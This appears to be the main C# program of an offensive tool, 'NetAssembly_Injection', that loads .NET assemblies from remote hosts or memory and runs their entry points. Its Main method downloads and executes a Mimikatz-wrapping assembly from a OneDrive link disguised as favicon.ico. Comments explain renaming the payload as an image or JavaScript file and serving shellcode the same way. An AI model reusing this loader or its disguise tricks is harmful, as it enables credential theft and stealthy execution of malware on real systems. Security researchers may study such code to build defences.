using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace NetAssembly_Injection
{
    class Program
    {
        static void Main(string[] args)
        {
            //Assembly loading code is wrapped in AssemblyLoader class.
            AssemblyLoader aLoader = new AssemblyLoader();

            //KatzNetAssembly.exe can be renamed to logo.png, favicon.ico, jquery-ui-v10.2.12.js on the remote web server, 
            //in this case OneDrive shared link (use your own, the link below expires after a certain period of time) for favicon.ico (renamed KatzNetAssemnly.exe) below is used, 
            //"ShellCodeLoader" generated assembly can be used in the same way to serve/execute your shellcode.
            Method1("https://odcnwa.db.files.1drv.com/y4m4HK6Ut6LA_hs7pT1IYBZnF3URcaQsn2It8Nt9VyJmwsAPutkB1zIeuFbMng1sPsQp-_hw8uSiBpGPV0RDQfkU4sjNJk6rVIxkLah_81uZwOxdUV6jBI4jUXHjboG5SWezOFbPTWeUrZhqzxl-vR4fGsj65XFDkxizbRgRtkOqNB64SO6PZEUNIKVZctDMscv1P2mO3YzOXK3DB59dc3Bxg/favicon.ico", aLoader);

            //Method2("http://127.0.0.1:8000/KatzNetAssembly.exe", aLoader);

            //Method3(aLoader); assembly_exect(.NET assembl)
        }


        /// <summary>
        /// Method 1: Loads a .NET assembly from a remote host using AppDomain to create an unrestricted container or sandbox allowing to download
        /// .NET assemblies from remote hosts and executing their main entry specified in the .NET Framework header. (check AssemblyLoader Class).
        /// </summary>
        static void Method1(string remoteAssemblyURL, AssemblyLoader aLoader){
            string[] arguments = new string[] { };
            aLoader.LoadFromRemoteHost(remoteAssemblyURL, arguments);
        }


        /// <summary>
        /// Method 2: Using Assembly.LoadFrom() to load .NET Assemblies from remote hosts (check AssemblyLoader Class).
        /// </summary>
        /// <param name="aLoader"></param>
        static void Method2(string remoteAssemblyURL, AssemblyLoader aLoader){
            string methodName = "Main";
            string[] arguments = new string[] { };
            aLoader.LoadByUrl(remoteAssemblyURL, methodName, arguments);
        }


        /// <summary>
        /// Method 3: already demonstrated/explained by @malcomvetter on https://medium.com/@malcomvetter/net-process-injection-1a1af00359bc
        /// </summary>
        /// 
        /// <remarks>
        /// methodName local var corresponds to the method to invoke (in a given .Net assembly), 
        /// in this case Main() is the method to invoke for launching Mimikatz once KatzNetAssembly.exe .NET assembly is loaded 
        /// (PE loader is based on a slightly modified version of @SubTee C# PE Loader, check KatzNetAssembly project source code)
        /// </remarks>
        static void Method3(AssemblyLoader aLoader)
        {

            string netAssembly = "KatzNetAssembly.exe";
            var assemblyBytes = File.ReadAllBytes(netAssembly);
            var b64Assembly = Convert.ToBase64String(assemblyBytes);

            string methodName = "Main";
            string[] arguments = new string[] { };
            aLoader.Load(b64Assembly, methodName, arguments);
        }

    }

}
